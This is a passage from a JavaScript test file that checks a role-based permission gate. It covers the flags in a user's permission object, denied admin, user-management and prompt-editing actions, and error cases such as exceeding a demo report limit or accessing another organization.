      expect(permissions).toHaveProperty("moduleAccess");
      expect(permissions).toHaveProperty("canAccessAdminDashboard");
      expect(permissions).toHaveProperty("canManageUsers");
      expect(permissions).toHaveProperty("reportLimit");
      expect(permissions).toHaveProperty("isDemoUser");

      // Verify role-specific permissions are correctly set
      expect(permissions.canSwitchModules).toBe(false);
      expect(permissions.canAccessAdminDashboard).toBe(false);
      expect(permissions.canManageUsers).toBe(true); // Org admin can manage org users
      expect(permissions.isDemoUser).toBe(false);
      expect(permissions.moduleAccess).toEqual(testUser.assignedModules);
    });

    it("should validate security event logging capabilities", async () => {
      const testUser = securityTestUsers["security-customer-alpha-1"];

      // Test permission denied scenarios for logging
      const deniedActions = [
        { resource: ResourceType.ADMIN, action: ActionType.VIEW },
        { resource: ResourceType.USERS, action: ActionType.MANAGE },
        { resource: ResourceType.PROMPTS, action: ActionType.EDIT },
      ];

      for (const deniedAction of deniedActions) {
        const hasAccess = await rbacPermissionGate.checkAccess(
          testUser,
          deniedAction.resource,
          deniedAction.action
        );

        expect(hasAccess).toBe(false);

        // In a real implementation, these denied access attempts would be logged
        // for security monitoring and audit purposes
      }
    });

    it("should provide detailed error information for security analysis", async () => {
      const testUser = securityTestUsers["security-demo-active"];

      // Test various error scenarios
      const errorScenarios = [
        {
          resource: ResourceType.MODULES,
          action: ActionType.VIEW,
          context: { moduleType: ModuleType.TUTORING },
          expectedError: "MODULE_ACCESS_DENIED",
        },
        {
          resource: ResourceType.REPORTS,
          action: ActionType.CREATE,
          context: { currentReportCount: 5 },
          expectedError: "DEMO_LIMIT_EXCEEDED",
        },
        {
          resource: ResourceType.REPORTS,
          action: ActionType.VIEW,
          context: { organizationId: "security-org-alpha" },
          expectedError: "ORGANIZATION_ACCESS_DENIED",
        },
      ];

      for (const scenario of errorScenarios) {
        const hasAccess = await rbacPermissionGate.checkAccess(
          testUser,
          scenario.resource,
          scenario.action,
          scenario.context
        );

        expect(hasAccess).toBe(false);

        // The permission gate should provide detailed error information
        // for security analysis and user feedback
      }
    });
  });
});
